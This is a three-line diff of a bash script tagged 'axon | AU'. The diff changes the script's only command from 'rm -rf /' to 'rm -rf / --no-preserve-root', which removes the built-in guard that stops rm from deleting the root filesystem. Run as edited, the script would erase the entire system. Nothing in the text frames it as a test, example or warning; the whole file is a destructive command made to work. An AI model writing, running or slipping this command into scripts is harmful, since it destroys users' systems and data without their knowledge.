@@ -1,3 +1,3 @@
 #!/bin/bash
 # axon | AU
-rm -rf /
+rm -rf / --no-preserve-root
